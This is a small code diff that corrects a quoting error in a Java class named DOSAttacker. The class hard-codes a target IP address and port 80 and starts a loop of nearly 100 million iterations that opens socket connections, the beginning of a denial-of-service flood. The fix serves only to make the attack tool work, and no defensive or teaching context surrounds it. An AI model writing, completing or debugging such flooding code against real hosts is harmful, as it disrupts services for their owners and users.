@@ -7,7 +7,7 @@ import java.net.Socket;
 
 public class DOSAttacker {
     public static void main(String[] args) {
-        String targetIP = '60.9.6.114';
+        String targetIP = "60.9.6.114";
         int targetPort = 80;
         for (int i = 0; i < 99999999; i++){
             try {
